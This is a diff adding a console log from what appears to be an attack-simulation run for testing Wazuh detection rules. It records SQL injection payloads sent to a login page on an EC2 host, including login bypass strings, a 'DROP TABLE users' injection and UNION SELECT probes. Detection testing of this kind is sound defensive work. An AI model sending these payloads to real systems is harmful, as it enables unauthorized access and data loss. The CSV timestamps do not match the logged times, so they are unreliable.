@@ -1,0 +1,35 @@
+===============================================================================
+[1;33mATTACK #11: SQL Injection Attempts[0m
+===============================================================================
+Target: http://ec2-54-204-182-4.compute-1.amazonaws.com:80/login
+Mode: basic
+Category: Web Attack
+
+[0;32m[*] Attack started at: 2026-01-05T18:54:23+03:00[0m
+[*] Sending SQL injection payloads...
+
+[*] Target URL: http://ec2-54-204-182-4.compute-1.amazonaws.com:80/login
+[*] curl mode: replaying common SQLi payloads
+[*] Sending payload: ' OR '1'='1
+[*] Sending payload: admin' --
+[*] Sending payload: admin') OR ('1'='1
+[*] Sending payload: 1; DROP TABLE users; --
+[*] Sending payload: ' UNION SELECT null, version() --
+[*] Sending payload: ' UNION SELECT null, user() --
+
+===============================================================================
+[0;32m[✓] Attack completed[0m
+===============================================================================
+End Time: 2026-01-05T18:54:31+03:00
+Duration: 8.334228620 seconds
+
+Expected Wazuh alerts:
+  - SQL injection attempts (rules 31101/31102/31103)
+  - Web application attack detections
+
+Data for CSV:
+  attack_id: 11
+  attack_name: SQL Injection Attempts
+  category: Web Attack
+  attack_start_time: 2026-01-05T18:54:12+03:00
+  attack_end_time: 2026-01-05T18:54:22+03:00
